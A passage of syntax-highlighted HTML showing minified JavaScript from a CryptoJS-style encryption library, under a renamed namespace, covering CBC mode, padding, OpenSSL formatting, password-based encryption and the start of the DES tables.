&#125;);</span><br><span class="line">    r.<span class="property">StreamCipher</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">1</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> l = t.<span class="property">mode</span> = &#123;&#125;</span><br><span class="line">      , h = <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = <span class="variable language_">this</span>.<span class="property">_iv</span>;</span><br><span class="line">        i ? <span class="variable language_">this</span>.<span class="property">_iv</span> = e : i = <span class="variable language_">this</span>.<span class="property">_prevBlock</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; n &gt; o; o++)</span><br><span class="line">            t[r + o] ^= i[o]</span><br><span class="line">    &#125;</span><br><span class="line">      , u = (r.<span class="property">BlockCipherMode</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">createEncryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Encryptor</span>.<span class="title function_">create</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">createDecryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Decryptor</span>.<span class="title function_">create</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span> = e,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_iv</span> = t</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)).<span class="title function_">extend</span>();</span><br><span class="line">    u.<span class="property">Encryptor</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_cipher</span></span><br><span class="line">              , n = r.<span class="property">blockSize</span>;</span><br><span class="line">            h.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, n),</span><br><span class="line">            r.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_prevBlock</span> = e.<span class="title function_">slice</span>(t, t + n)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    u.<span class="property">Decryptor</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_cipher</span></span><br><span class="line">              , n = r.<span class="property">blockSize</span></span><br><span class="line">              , i = e.<span class="title function_">slice</span>(t, t + n);</span><br><span class="line">            r.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            h.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, n),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_prevBlock</span> = i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    l = l.<span class="property">CBC</span> = u,</span><br><span class="line">    u = (t.<span class="property">pad</span> = &#123;&#125;).<span class="property">Nopk</span> = &#123;</span><br><span class="line">        <span class="attr">pad</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="number">4</span> * t, r = r - e.<span class="property">sigBytes</span> % r, n = r &lt;&lt; <span class="number">24</span> | r &lt;&lt; <span class="number">16</span> | r &lt;&lt; <span class="number">8</span> | r, o = [], a = <span class="number">0</span>; r &gt; a; a += <span class="number">4</span>)</span><br><span class="line">                o.<span class="title function_">push</span>(n);</span><br><span class="line">            r = i.<span class="title function_">create</span>(o, r),</span><br><span class="line">            e.<span class="title function_">concat</span>(r)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">unpad</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            e.<span class="property">sigBytes</span> -= <span class="number">255</span> &amp; e.<span class="property">words</span>[e.<span class="property">sigBytes</span> - <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    r.<span class="property">BlockCipher</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: c.<span class="property">cfg</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">mode</span>: l,</span><br><span class="line">            <span class="attr">padding</span>: u</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            c.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">cfg</span></span><br><span class="line">              , t = e.<span class="property">iv</span></span><br><span class="line">              , e = e.<span class="property">mode</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_xformMode</span> == <span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>)</span><br><span class="line">                <span class="keyword">var</span> r = e.<span class="property">createEncryptor</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r = e.<span class="property">createDecryptor</span>,</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_minBufferSize</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_mode</span> = r.<span class="title function_">call</span>(e, <span class="variable language_">this</span>, t &amp;&amp; t.<span class="property">words</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_mode</span>.<span class="title function_">processBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="property">padding</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_xformMode</span> == <span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>) &#123;</span><br><span class="line">                e.<span class="title function_">pad</span>(<span class="variable language_">this</span>.<span class="property">_data</span>, <span class="variable language_">this</span>.<span class="property">blockSize</span>);</span><br><span class="line">                <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>)</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                t = <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>),</span><br><span class="line">                e.<span class="title function_">unpad</span>(t);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">4</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> p = r.<span class="property">CipherParams</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">mixIn</span>(e)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">toString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (e || <span class="variable language_">this</span>.<span class="property">formatter</span>).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , l = (t.<span class="property">format</span> = &#123;&#125;).<span class="property">OpenSSL</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">ciphertext</span>;</span><br><span class="line">            <span class="keyword">return</span> e = e.<span class="property">salt</span>,</span><br><span class="line">            (e ? i.<span class="title function_">create</span>([<span class="number">1398893684</span>, <span class="number">1701076831</span>]).<span class="title function_">concat</span>(e).<span class="title function_">concat</span>(t) : t).<span class="title function_">toString</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            e = a.<span class="title function_">parse</span>(e);</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1398893684</span> == t[<span class="number">0</span>] &amp;&amp; <span class="number">1701076831</span> == t[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">var</span> r = i.<span class="title function_">create</span>(t.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                t.<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">                e.<span class="property">sigBytes</span> -= <span class="number">16</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">ciphertext</span>: e,</span><br><span class="line">                <span class="attr">salt</span>: r</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , f = r.<span class="property">SerializableCipher</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">format</span>: l</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n);</span><br><span class="line">            <span class="keyword">var</span> i = e.<span class="title function_">createEncryptor</span>(r, n);</span><br><span class="line">            <span class="keyword">return</span> t = i.<span class="title function_">finalize</span>(t),</span><br><span class="line">            i = i.<span class="property">cfg</span>,</span><br><span class="line">            p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">ciphertext</span>: t,</span><br><span class="line">                <span class="attr">key</span>: r,</span><br><span class="line">                <span class="attr">iv</span>: i.<span class="property">iv</span>,</span><br><span class="line">                <span class="attr">algorithm</span>: e,</span><br><span class="line">                <span class="attr">mode</span>: i.<span class="property">mode</span>,</span><br><span class="line">                <span class="attr">padding</span>: i.<span class="property">padding</span>,</span><br><span class="line">                <span class="attr">blockSize</span>: e.<span class="property">blockSize</span>,</span><br><span class="line">                <span class="attr">formatter</span>: n.<span class="property">format</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="title function_">_parse</span>(t, n.<span class="property">format</span>),</span><br><span class="line">            e.<span class="title function_">createDecryptor</span>(r, n).<span class="title function_">finalize</span>(t.<span class="property">ciphertext</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_parse</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e ? t.<span class="title function_">parse</span>(e, <span class="variable language_">this</span>) : e</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , t = (t.<span class="property">kdf</span> = &#123;&#125;).<span class="property">OpenSSL</span> = &#123;</span><br><span class="line">        <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n || (n = i.<span class="title function_">random</span>(<span class="number">8</span>)),</span><br><span class="line">            e = s.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">keySize</span>: t + r</span><br><span class="line">            &#125;).<span class="title function_">compute</span>(e, n),</span><br><span class="line">            r = i.<span class="title function_">create</span>(e.<span class="property">words</span>.<span class="title function_">slice</span>(t), <span class="number">4</span> * r),</span><br><span class="line">            e.<span class="property">sigBytes</span> = <span class="number">4</span> * t,</span><br><span class="line">            p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">key</span>: e,</span><br><span class="line">                <span class="attr">iv</span>: r,</span><br><span class="line">                <span class="attr">salt</span>: n</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , d = r.<span class="property">PasswordBasedCipher</span> = f.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: f.<span class="property">cfg</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">kdf</span>: t</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            r = n.<span class="property">kdf</span>.<span class="title function_">execute</span>(r, e.<span class="property">keySize</span>, e.<span class="property">ivSize</span>),</span><br><span class="line">            n.<span class="property">iv</span> = r.<span class="property">iv</span>,</span><br><span class="line">            e = f.<span class="property">encrypt</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, r.<span class="property">key</span>, n),</span><br><span class="line">            e.<span class="title function_">mixIn</span>(r),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="title function_">_parse</span>(t, n.<span class="property">format</span>),</span><br><span class="line">            r = n.<span class="property">kdf</span>.<span class="title function_">execute</span>(r, e.<span class="property">keySize</span>, e.<span class="property">ivSize</span>, t.<span class="property">salt</span>),</span><br><span class="line">            n.<span class="property">iv</span> = r.<span class="property">iv</span>,</span><br><span class="line">            f.<span class="property">decrypt</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, r.<span class="property">key</span>, n)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="variable language_">this</span>.<span class="property">_lBlock</span> &gt;&gt;&gt; e ^ <span class="variable language_">this</span>.<span class="property">_rBlock</span>) &amp; t;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_rBlock</span> ^= r,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_lBlock</span> ^= r &lt;&lt; e</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="variable language_">this</span>.<span class="property">_rBlock</span> &gt;&gt;&gt; e ^ <span class="variable language_">this</span>.<span class="property">_lBlock</span>) &amp; t;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_lBlock</span> ^= r,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_rBlock</span> ^= r &lt;&lt; e</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> r = coypJsDk</span><br><span class="line">      , n = r.<span class="property">lib</span></span><br><span class="line">      , i = n.<span class="property">WordArray</span></span><br><span class="line">      , n = n.<span class="property">BlockCipher</span></span><br><span class="line">      , o = r.<span class="property">algo</span></span><br><span class="line">      , a = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">      , s = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">      , c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>]</span><br><span class="line">      , l = [&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">268435456</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">536870912</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">805306368</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">1073741824</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1342177280</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">1610612736</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">1879048192</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">2147483648</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">2415919104</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">2684354560</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">2952790016</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">3221225472</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">3489660928</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">3758096384</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">4026531840</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">134217728</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">402653184</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">671088640</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">939524096</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">1207959552</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">1476395008</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1744830464</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">2013265920</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">2281701376</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">2550136832</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">2818572288</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">3087007744</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">3355443200</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">3623878656</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">3892314112</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">4160749568</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">268435457</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">536870913</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">805306369</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">1073741825</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">1342177281</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">1610612737</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1879048193</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">2147483649</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">2415919105</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">2684354561</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">2952790017</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">3221225473</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">3489660929</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">3758096385</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">4026531841</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">134217729</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">402653185</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">671088641</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">939524097</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1207959553</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">1476395009</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">1744830465</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">2013265921</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">2281701377</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">2550136833</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">2818572289</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">3087007745</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">3355443201</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">3623878657</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3892314113</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">4160749569</span>: <span class="number">8421378</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">16777216</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">33554432</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">50331648</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">67108864</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">83886080</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">100663296</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">117440512</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">134217728</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">150994944</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">167772160</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">184549376</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">201326592</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">218103808</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">234881024</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">251658240</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">8388608</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">25165824</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">41943040</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">58720256</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">75497472</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">92274688</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">109051904</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">125829120</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">142606336</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">159383552</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">176160768</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">192937984</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">209715200</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">226492416</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">243269632</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">260046848</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">268435456</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">285212672</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">301989888</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">318767104</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">335544320</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">352321536</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">369098752</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">385875968</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">402653184</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">419430400</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">436207616</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">452984832</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">469762048</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">486539264</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">503316480</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">520093696</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">276824064</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">293601280</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">310378496</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">327155712</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">343932928</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">360710144</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">377487360</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">394264576</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">411041792</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">427819008</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">444596224</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">461373440</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">478150656</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">494927872</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">511705088</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">528482304</span>: <span class="number">540672</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">1048576</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2097152</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">3145728</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">4194304</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">5242880</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">6291456</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">7340032</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">8388608</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">9437184</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">10485760</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">11534336</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">12582912</span>: <span 